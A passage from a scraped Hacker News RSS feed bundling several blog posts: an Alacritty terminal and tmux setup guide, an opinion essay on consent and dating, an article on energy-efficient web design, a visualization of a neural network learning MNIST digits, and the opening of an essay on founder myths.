<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><article><img src="https://bradbarrows.com/static/alacritty.png" alt="Alacritty - Fastest OSX Terminal?"><div><h2>Introducing Alacritty</h2><p>Alacritty is most likely the fastest GPU accelerated terminal emulator for OSX.</p><p>The only reason I hadn't tried it or used it very much before was the learning curve 
of a new terminal emulator and it's lack of tabs.</p><p>Luckily I was able to figure out how to make a great tmux and alacritty configuration 
file along with some nice bash functions to help with editing the configurations.</p><h2>Setting up Alacritty using my build</h2><p>First <a href="https://github.com/bebrws/alacritty/releases/download/0.6.0-dev-brads/Alacritty.zip">install Alacritty</a> from my repo to get a build that has an "Always On Top' action
I built in. The keyboard combo for this will "Command Shift A".</p><h2>Setting up Alacritty using my tmux and alacritty config</h2><p>Next clone my <a href="https://github.com/bebrws/myalacritty">configuration files</a></p><pre><code>git clone git@github.com:bebrws/myalacritty.git
cd myalacritty
cp tmux.conf ~/.tmux.conf
mkdir -p ~/.config/alacritty/
cp * ~/.config/alacritty/
wget http://bradbarrows.com/dls/jsin.zip
unzip jsin.zip
mv jsin /usr/local/bin/jsin</code></pre><h2>Bash/ZSH functions</h2><p>Add these functions to your .zshrc</p><pre><code>######### ALACRITTY GOOODNESS ############
alias -g alacrittycolors='python3 /Users/bbarrows/Library/Python/3.8//lib/python/site-packages/alacritty_colorscheme/cli.py '
# To use run: alaFontSize 12
function alaFontSize() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.font.size=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaOpacity 0.8
function alaOpacity() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.background_opacity=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaColorTheme
# Must run: sudo pip3 install alacrittycolors
# before using
# Also make sure jsin is installed from above or: https://github.com/bebrws/jsin
function alaColorTheme() {
   export ALABASE=$(python3 -m site | grep site | grep packages | head -n 1 | jsin "l.replace(/\s*\'/g, '').replace(/,/g, '')")
   python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/$(ls  ~/.config/alacritty/colors/ | fzf --preview "python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/{} &amp;&amp; htop")
}
function alaResetDark()  {
  cp ~/.config/alacritty/alacritty.yml.dark ~/.config/alacritty/alacritty.yml
}
function alaResetLight()  {
  cp ~/.config/alacritty/alacritty.yml.light  ~/.config/alacritty/alacritty.yml
}</code></pre><h2>Keyboard shortcuts</h2><ul><li>You should end up with tabs that you can click on just like Terminal.app and then can use the keyboard shortcuts "Shift-Left or Right arrow key".</li><li>"Control-b then c" - Create a new tab</li><li>"Control-b then f" - Create a horizonal window in the tab</li><li>"Control-b then v" - Create a veritical window in the tab</li><li>"Alt-Left or Right arrow key" - Move between split windows in the tab</li><li>"Command-Shift-A" - Keep Alacritty always on top</li><li>"Command-Shift-F" - Full screen</li><li>"Command-Shift-=/-" - Font size</li></ul><p>All the control and alt backspace and arrow key bindings should work out of the box!</p><p>You will end up with this beautiful terminal:</p><p><img alt="Alacritty in action" src="https://bradbarrows.com/static/alacritty.gif"></p></div></article></div></div></section></div>]]>
            </description>
            <link>https://bradbarrows.com/post/alacritty</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513821</guid>
            <pubDate>Fri, 18 Sep 2020 07:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Love Hurts: So let’s stop infantilizing women and demonizing men]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513528">thread link</a>) | @jseliger
<br/>
September 17, 2020 | https://www.persuasion.community/p/love-hurts-511 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/love-hurts-511">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1378800,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>If you've ever read a Regency romance novel or watched a Jane Austen adaptation, you probably have a passing acquaintance with the trope of the <em>ruined woman</em>: that tragic victim of some caddish man who loved her, left her, and wrecked her societal resale value on his way out the door. In a world governed by a patriarchal system of marriage and inheritance, dependent on female purity to ensure any male offspring were legitimate, the ruined woman was literally damaged goods. Even the slightest whiff of a premarital dalliance could spell her undoing.</p><p>These old school ideas about women's worth have never entirely left us, resurfacing over the years in everything from the work of Andrea Dworkin to the abstinence wars of the late 1990s (when sex ed teachers would memorably compare girls who had sex before marriage to used pieces of Scotch tape). With dowries out of the picture, the idea that sex devalued women attached itself instead to America's sudden obsession with self-esteem. A young woman who had sex, particularly casual sex, clearly didn't respect herself. She was trying to fill an emotional void with cheap physical connection, and—yes—was making herself unmarriageable. <em>He won’t buy the cow,</em> we were told, <em>if he can get the milk for free.</em></p><p>Today, the notion that sexual contact is degrading to women has become wrapped up in the contemporary progressive language of trauma and consent. The damage in question is emotional, not material, but the paternalistic message is the same: innocent women must be protected. </p><p><em>Consent is sexy</em>, we are told, as sex-education pamphlets primly instruct us in the essentials of mid-coital conversation.<em> Do you like it when I touch you there? What do you want me to do to you? </em>Never mind that said literature studiously ignores the fact that for the young, inexperienced people at whom such instructions are directed, dirty talk by administrative mandate just adds a whole new layer of pressure to an already awkward situation: For all its protestations about how <em>hot </em>consent can be, the progressive discourse surrounding sex is markedly unsexy. Amid the obsession with power, oppression and the ever present threat of harm, the notion of desire (or, heaven forbid, <em>fun</em>) all but disappears. Even the most pornographic consent-is-sexy script is about risk mitigation, not titillation, an insurance waiver with a side of heavy breathing. </p><p>This laser-focus on consent effectively recasts sex itself as a dangerous act, to be undertaken with extreme caution and only if absolutely necessary. And if relationships are mainly about power and the threat of abuse, those who pursue them too enthusiastically must be viewed with suspicion. More old-school gender stereotypes crop up here: men are increasingly seen as predators almost by default, while women are cast as helpless, even infantile. (Witness the rise of the word "grooming," previously reserved for sexual predation of children, as something done to women in their twenties.) As a breathtaking range of disappointing male behavior gets swept under the umbrella of MeToo, the line between pursuing a woman and preying on her has become blurred. When it was revealed that comic book writer Warren Ellis <a href="https://www.theguardian.com/books/2020/jul/13/women-speak-out-about-warren-ellis-transmetropolitan">had relationships with multiple women at once</a>, the litany of harms included no sexual misconduct at all; instead, the women were "[shocked] at the sheer magnitude of his pursuits … heartbroken when he stopped talking to them, or angry after discovering he was sending many of them identical messages." </p><p>Shock, heartbreak, anger: these are normal things to feel when a romantic relationship goes sour. But today, they're lumped into the nefarious category of abuse by virtue of the purported power someone like Ellis—older, wealthier, more professionally successful, or otherwise more <em>privileged</em>—holds over his partners. By contrast, the notion that these were known and unavoidable risks of intimacy is dismissed as victim-blaming. As one of Ellis' accusers tweeted, "None of us consented to being manipulated." </p><p>This notion of consent as a safeguard against upsetting emotions is both new and counterintuitive: in most contexts (for instance, medical trials or media interviews), consent is sought precisely because what follows cannot be predicted, and may well be uncomfortable. But in certain progressive spaces, discomfort of any kind is taken to indicate the absence of consent, rendering countless normal human interactions suspicious. Turning someone down isn't comfortable, but neither is asking someone out. Even happy relationships involve moments of discomfort, disappointment, conflict—and even amicable breakups are rarely pain-free. Yet young people are now being taught to expect absolute emotional safety in sex, love and courtship at all times—and that if they feel hurt, disappointed or betrayed, it means they've been violated.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><div><p>So how did we get here? Social conservatives say that hookup culture is to blame, and they're not wrong: traditional courtship, monogamy and marriage have their downsides, but they do give relationships a certain amount of structure and security. In the age of Tinder, those safeguards are comparatively hard to come by—and the elaborate (and sometimes ridiculous) bureaucracy of consent regulations may be best understood as a desperate attempt to impose some order on this wild west of sex and intimacy, spearheaded by people who are terrified of being vulnerable or getting hurt. There's a sense that relationships could be made unfailingly safe and comfortable, that disappointment and awkwardness wouldn't exist, if we only had enough <em>rules</em>. </p><p> Relationships have always been risky endeavors, but, ironically, this hypervigilance has made them seem outright terrifying. Every new romance is treated like a scavenger hunt for "red flags" that forewarn abuse, and every breakup is subject to adjudication via the #MeToo framework. Unhappy exes hash out their grievances on social media in a way that used to be reserved for divorced celebrities wrangling for the sympathy of the press. Private affairs are dragged into the spotlight for public reckoning and reparations. Men, already saddled with the pressure of making the first move, have to calculate the additional risk that an awkward overture or misread signal will result not just in rejection, but public humiliation and ruination. For all its valuable contributions to combating sexual harassment in the workplace, #MeToo has also made dating itself at once more fraught and less appealing—for everyone. If every relationship is a power struggle, in which the less privileged party is perpetually at risk of being victimized, why even bother? Who could possibly enjoy this? </p></div><p>This is not to demand a return to the rigid courtship norms of the Regency era—nor to the blinkered sex-positivity of the early aughts. Instead, we need to reintroduce basic notions of female empowerment and individual agency, and push back against the facile understanding of complex interpersonal relationships as power struggles between oppressed and oppressor. We should teach both young men <em>and</em> young women to recognize each other's vulnerability and humanity—even when a partner may hold more power than they do by certain measures—and to engage with their lovers as individuals, rather than as representatives of an identity group. And we should also teach young people to tolerate and work through discomfort, rather than seeing themselves as helplessly in thrall to power dynamics that leave them forever teetering on the precipice of victimhood. </p><p>When I wrote a teen advice column between 2009 and 2019, there was one question I received more often than any other: "How can I fall in love without getting hurt?" My answer was always the same: You can't! Intimacy requires vulnerability; the joy of human connection always comes with the risk of being hurt. But that risk is the same for everyone, no matter how privileged or blessed with institutional clout. Even the wealthiest, whitest, most cisheterosexual dudebro in the world can be absolutely wrecked by heartbreak—and even a person who sits at the intersectional nexus of multiple oppressed identity categories has the power to break someone's heart.</p><p>As much as trauma and abuse have replaced purity and marriageability on the landscape of moral panics, the same old fear is at work: that women's desires, left unchecked, will leave them in ruins. And while the impulse to protect young people from emotional pain may be well intentioned, the results are toxic. The obsessive focus on power as the driving mechanism in all relationships fuels a cycle of catastrophic thinking: women are ever more fearful of being mistreated, ever more convinced of their powerlessness to avoid it, and ever more sure that when it happens, they will be unable to handle it. And all the while, men, dehumanized by a framework that casts their desires as inherently predatory, are being taught to mistrust and infantilize women in the guise of respecting them.</p><p>We need to permanently banish the specter of the ruined woman from our understanding of heterosexual relationships. A healthy, sex-positive society acknowledges that unpredictability is a feature of dating, not a bug, and cannot be consent-scripted out of existence—particularly for inexperienced people, and especially when it comes to casual sex. Young people must be taught to be kind with and conscientious to each other, to respect boundaries, and to err on the side of caution in ambiguous situations—but they should also be taught that love and sex are rife with painful misunderstandings, and that even well-meaning people can hurt each other because they're insecure, confused or genuinely unsure about what they want. Instead of trying to keep them from ever feeling heartbreak, regret or shame, let's teach them that these things are always survivable, and sometimes even useful. Teach them to be gracious about rejection and charitable about missteps, knowing that they'll make mistakes …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.persuasion.community/p/love-hurts-511">https://www.persuasion.community/p/love-hurts-511</a></em></p>]]>
            </description>
            <link>https://www.persuasion.community/p/love-hurts-511</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513528</guid>
            <pubDate>Fri, 18 Sep 2020 06:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How can we, as web professionals, help to make the web more energy efficient?]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 382 (<a href="https://news.ycombinator.com/item?id=24513427">thread link</a>) | @giuliomagnifico
<br/>
September 17, 2020 | https://cmhb.de/web-design-and-carbon-impact | <a href="https://web.archive.org/web/*/https://cmhb.de/web-design-and-carbon-impact">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<section>
    <div><blockquote>
<p>How can we, as web professionals, help to make the web more energy efficient?</p>
</blockquote>
<p>From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It’s probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.</p>
<hr>
<h2>Attitudes</h2>
<p>Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn’t really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. </p>
<p>So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don’t care. They’re probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they’re wasting expensive data on mobile connections in other countries? “But Carl, some of us don’t have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.” Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.</p>
<p>When we talk about the energy efficiency of websites, it’s easy to assume that it’s a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.</p>
<p>Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are <em>designers</em>. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the <em>best of the web</em>, where the only criteria is: “Does it look well-designed?” Well, look under the hood. It’s pretty terrifying. And that’s not even getting into the many accessibility concerns. If only more designers would ask themselves, “When was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?” </p>
<p>These are questions I have put to designers before, and the response quite often is, “I’m just experimenting with technologies and trying to improve my UI skills. What harm is there in that?” Well, <em>Site of the Day</em>, the harm is your energy usage, and the likelihood that nobody—besides an echo chamber of fellow designers—give a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That’s not to say aesthetics aren’t important—they certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.</p>
<hr>
<h2>Solutions</h2>
<p>Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.</p>
<p>So how can we be more energy efficient in web design? Well, the folks over at <a href="https://www.wholegraindigital.com/blog/website-energy-efficiency/">Wholegrain Digital</a> put together a comprehensive list, but here are some key considerations:</p>
<h3>Reduce Images</h3>
<p>The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:</p>
<ul>
<li>Does the image genuinely add value to the user?</li>
<li>Does it communicate useful information?</li>
<li>Could the same impact be achieved if the image was smaller?</li>
<li>Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?</li>
</ul>
<h3>Optimise Images</h3>
<p>Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:</p>
<ul>
<li>Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.</li>
<li>Use image optimisation tools before you upload them to your site. I personally use <a href="https://imageoptim.com/mac">ImageOptim</a>.</li>
<li>Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).</li>
<li>Use image processing tools to resize, crop, and enhance your images that are served. I use <a href="https://www.imgix.com/">imgimx</a> for this, which works well for image-heavy sites such as <a href="https://minimalissimo.com/">Minimalissimo</a>.</li>
</ul>
<h3>Reduce Video</h3>
<p>By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it’s annoying as hell. Let the user decide whether or not to play a video.</p>
<h3>Font Selection and Optimisation</h3>
<p>Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:</p>
<ul>
<li>Use system fonts where possible.</li>
<li>Use fewer font variations.</li>
<li>Stick to modern web font file formats like WOFF and WOFF2.</li>
<li>Subset fonts to only include the characters needed on the site.</li>
</ul>
<h3>Write Clean Code</h3>
<p>Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I’ll take this opportunity to share a controversial opinion: <em>all designers should learn to code.</em> At least if they want a website. No-code site builders can be very good, but if you’re not aware of the underlying code, then you’ll be less aware of ways to optimise your site.</p>
<h3>Use Less Javascript</h3>
<p>JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user’s device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don’t let advertising get in the way of craftsmanship.</p>
<h3>Use Server Caching</h3>
<p>Using caching technologies such as <a href="https://memcached.org/">Memcached</a> or <a href="https://varnish-cache.org/">Varnish</a> pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. </p>
<h3>SEO</h3>
<p>When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don’t meet their needs.</p>
<hr>
<p>No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.</p>
<hr>
<h2>Useful Resources</h2>
<ul>
<li><a href="https://www.websitecarbon.com/">Website Carbon</a> (test your site’s carbon footprint)</li>
<li><a href="https://imageoptim.com/mac">ImageOptim</a> (image optimisation tool)</li>
<li><a href="https://www.imgix.com/">imgix</a> (image processing tool)</li>
<li><a href="https://developers.google.com/speed/pagespeed/insights/">Google PageSpeed Insights</a> (test your site’s performance)</li>
<li><a href="https://solar.lowtechmagazine.com/low-tech-solutions.html">Low-tech Solutions</a> (by Low-tech Magazine)</li>
</ul></div>
</section>
    </div></div>]]>
            </description>
            <link>https://cmhb.de/web-design-and-carbon-impact</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513427</guid>
            <pubDate>Fri, 18 Sep 2020 06:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Visualizing how a NeuralNetwork learns to recognize the MNIST digits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513373">thread link</a>) | @zbendefy
<br/>
September 17, 2020 | https://zbendefy.github.io/neuralnet-web/index.html | <a href="https://web.archive.org/web/*/https://zbendefy.github.io/neuralnet-web/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    <p>Visualizing a neural network
    </p>

    

    <p>
        Training a Neural network to perform well is not an easy task. The many
        layers of neurons, each having lots of weights and biases often add up
        to several millions of parameters to configure trough learning. Understanding what
        these parameters do by looking at them as raw data is not possible, thus we need somehow visualuze
        what the network does.
        Beside the architecture of the network, we also have to choose and tune a range of training parameters as well, such as activation function,
        regularization parameters and cost function that, to be tuned well, require some rough idea of what 
        the network does.
    </p>

    <picture>
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.webp" type="image/webp">
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.gif" type="image/gif">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/preview.webp">
            <p> 
                A neural network learning to recognize digits. Each pixel represents a weight of the network.
            </p>
        
    </picture>

    <p>
        In a conventional algorithm choosing an optimal structure for the data the algorithm operates 
        on can be relatively easily figured out by analyzing the cost of the algorithm and conducting measurements.
        Debugging such an algorithm is also relatively straightforward with many advanced tools available.
        In the case of neural networks however it is often very difficult to understand what a network had eventually
        learned to do during a training, let alone guessing it beforehand. And when a network is not behaving like expected, 
        the familiar debugging tools are not that helpful in figuring out where the issue lies. In some cases however 
        such as image recognition problems we can sort of visualize what the network is trying to learn
        and gain some insight into the learning process. Let's see an example to that.
    </p>
    
    <p>
        The <a href="http://yann.lecun.com/exdb/mnist/">MNIST dataset</a> of hand-written digits is a classic example to introduce machine learning on.
        This dataset contains pictures of hand-written numbers from 0 to 9 and are annotated with the number that is drawn on them.
        The size of the pictures is 28x28 pixels, (in total 784 pixels).
        As such, the data can be used to train a neural network using the pictures as inputs, and the corresponding number as the desired output.
        There are 60,000 training examples and 10,000 test examples in the dataset to train and test on.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/MnistExamples.png">
        <p> 
            Some example images from the MNIST dataset
        </p>
    

    <p>
        To try things out, I trained a very simple network using my 
        <a href="https://github.com/zbendefy/machine.academy">neural network library</a> with the following parameters:
    </p>


    <ul>
        <li>Input layer: 784 neurons (one for each pixel of a source image)</li>
        <li>1 Hidden layer: 64 neurons</li>
        <li>Output layer: 10 neurons (1 neuron for each possible output)</li>
        <li>Sigmoid activation is used</li>
        <li>Cross-entropy cost function</li>
        <li>L2 regularization (lambda=1,5)</li>
        <li>Learning rate: 0.01</li>
    </ul>

    <p>
        The network was initialized using the Xavier initialization that provides a good randomized starting point for a network to be trained. 
        The total number of weights and biases is 50,890.
        The training was run for 230 epochs on the 60,000 training examples using 500 sized mini-batches randomized before each epoch.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/diagram.svg">
        <p> 
            The structure of the network
        </p>
    

    <p>
        After each epoch the performance of the network was measured against the 10,000 test examples from the dataset.
        The tests were showing promising results very early on. From the initial state, where the network answered 8.92% of the tested
        examples right (a mere random guess would result in a ~10% success rate), after 4 epochs it surpassed the 50% mark. 80% was reached
        in the 17th epoch, and 90% in the 79th epoch. After 230 epochs the training finished at a success rate of ~92.5%.
    </p>
    
    <p>
        Here you can try out the result of the network. Draw a number using your mouse or your touchscreen and press the 'What did I draw?' button!
    </p>

    <div>
        <canvas id="drawCanvasSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvas" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResult">Draw a number from 0 to 9!</p>
    </div>

    <p>
        It doesn't really work! Seeing a more than 90% success rate caused high expectations, but after trying some of my own drawings on the network
        it became apparent that the network is failing to recognize hand written digits.
        Around 3 out of 10 of my attempts were successful and that is very far from 90%.
    </p>
    
    <p>
        So what is going on here? To gain a better understanding of why the network fails to recognize our 
        own drawings let's try to visualize the neurons during training in a way that makes sense of the data and
        see if we can find out whats happening!
    </p>
    
    <p>
        On the next video, you can follow trough the learning process epoch by epoch.
        
        In the Hidden layer section you can see the 64 neurons of the Hidden layer in a 8x8 arrangement.
        Each neuron is a 28x28 grid, showing red pixels for positive weights, and blue pixels for negative weights
        as they connect to the Input layer (that is essentially the input image). 
        The bias (or negative threshold) is also visible as a vertical bar on the right side of the weights.
        Yellow is for positive biases and green is for negative ones.
        The Output layer consists of 10 neurons, each having 8x8 weights connecting to each of the neurons in
        the Hidden layer.
    </p>

    <video controls="">
        <!-- <source src="assets/learning.av1.mp4" type="video/mp4; codecs=av01"/> -->
        <source src="https://zbendefy.github.io/neuralnet-web/assets/learning.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>
    
    <p>
        As the network is learning you can see some curly patterns emerging from the initial random noise. Those patterns are the common
        parts of numeric digits that the network generalized to. Looking at this image, it seems like each neuron in the Hidden layer is sort of like a function
        in a programming language, meaning that a following layer (in this case the Output layer) can use the Hidden
        layer's neurons as if they were functions implementing some abstracted behavior. By adjusting a weight in one of
        the the Output layer's neurons, it can selectively discard or use the result of the corresponding 'function' in the Hidden layer.
        This is a very powerful way to process things. Imagine having a programming language, where you are not allowed to use any functions:
        you would have to copy-paste a lot of code around meaning that you'd use up a lot more space due to the more instructions.
        Using multiple layers in a network therefore allows us to use way less total neurons to achieve similiar results.
    </p>
    
    <p>
        The patterns that have emerged in the Hidden layer are quite interesting. As we discussed they are probably some
        generalization of hand-drawn numbers, an efficient, compact way of differentiating from one digit to an other.
        Looking at them closely reveals some interesting property though: they seem to be noticably centered inside 
        the 28x28 pixel sized region. Could this mean that the MNIST data was somehow pre-processed? 
        The MNIST dataset's description reveals that in fact this is the case:
    </p>

    <div>
        <p>
            ❞
        </p>
        <p>
            The images were centered in a 28x28 image by computing the center of mass of the pixels, and translating the image so as to position this point at the center of the 28x28 field.
        </p>
    </div>

    <p>
        That's the issue! The previous drawing applet didn't actually take that into consideration, and as the network only ever encountered
        images that were previously centered, it only learned to recognize those.
        The solution now seems simple: Calculate the center of mass for the image that is drawn, and translate the image so that it is in 
        the middle of the 28x28 region.
        This fixes the issue entirely, providing a network that can actually recognize digits. Try out the fixed version here:
    </p>

    <div>
        <canvas id="drawCanvasCorrectedSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvasCorrected" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResultCorrected">Draw a number from 0 to 9!</p>
        
    </div>

    <p>
        We could also randomly translate the input images and train the network on that, but that is an unnecessarily harder
        problem for a network to solve. A conventional algorithm is perfectly suitable for this task. 
        Additionally the translation might not be enough, for even better results we should fit the size of the drawing
        to the 28x28 pixel grid.
    </p>
    
    <p>
        One other interesting insight that we can gain from this visualization, is that the 64 neurons of the Hidden layer are
        in fact more than what the network needs. Pause the video at the end of the learning process, and you'll see that out of
        the 64 neurons in the Hidden layer, around 12 of them are noticably dimmer than the rest. It seems like that 
        these neurons have very little impact on the final result, and their values are not that important.
        If you focus on the top-left neuron on the 8x8 grid, you can see that not only it is very dim, but also 
        none the Output layer's 10 neurons reference that top-left neuron with a high enough weight to matter, meaning that it is a 
        mostly redundant. This is a direct hint that we could reduce the neuron count in the Hidden layer to speed up
        learning.
    </p>
    
    

    <p>
        Thanks for reading. If you would like to experiment with this network, you can download it in JSON format by <a href="https://zbendefy.github.io/neuralnet-web/network_000230.json">clicking here</a>.
        Also you can check out my C# Neural Network library called <a href="https://github.com/zbendefy/machine.academy">machine.academy</a>, featuring GPU acceleration.
    </p>
    
    <p>
        The SVG image of the network's structure was made using <a href="http://alexlenail.me/NN-SVG/LeNet.html">this</a> awesome tool available online.
    </p>

    
    
    <a href="https://github.com/zbendefy/neuralnet-web">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/githublogo.png">
        
    </a>








</div>]]>
            </description>
            <link>https://zbendefy.github.io/neuralnet-web/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513373</guid>
            <pubDate>Fri, 18 Sep 2020 05:50:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ignore every founder’s story on how they started their company]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513310">thread link</a>) | @trevmckendrick
<br/>
September 17, 2020 | https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company | <a href="https://web.archive.org/web/*/https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>By Trevor McKendrick 👋 - Have you <a href="https://www.trevormckendrick.com/newsletter" target="_blank">read my free newsletter</a>?<br>‍</p></div><div><div><h3>Founding Stories Are Myths</h3><p>Company founding stories are almost always non-malicious lies. Take the image above of Reed Hastings @ Netflix....</p><p>Reed Hastings has <a href="https://www.vanityfair.com/news/2013/02/07-reed-hastings">said</a> <a href="http://archive.fortune.com/2009/01/27/news/newsmakers/hastings_netflix.fortune/index.html">many</a> <a href="https://twitter.com/netflix/status/2746816142?lang=en">times</a> <a href="https://www.wired.com/2002/12/netflix-6/">that</a> <a href="http://www.evancarmichael.com/library/reed-hastings/Reed-Hastings-Quotes.html">he got the</a> <a href="https://www.hollywoodreporter.com/news/reed-hastings-innovator-year-81514">idea</a> for Netflix because he once was charged a $40 late fee on Apollo 13.</p><p>That didn’t actually happen. </p><p>It’s unfortunate because it will inevitably mislead anyone learning how to start a company. </p><h3>Sam Walton's Overnight Success</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e70c3fecf07561da8e7_grand_opening.jpeg" alt=""></p></figure><p>Sam was already 44(!) when he opened the first Walmart and had been running his own retail stores for over 15 years.</p><p>He wondered why people focused on the beginning of Walmart: 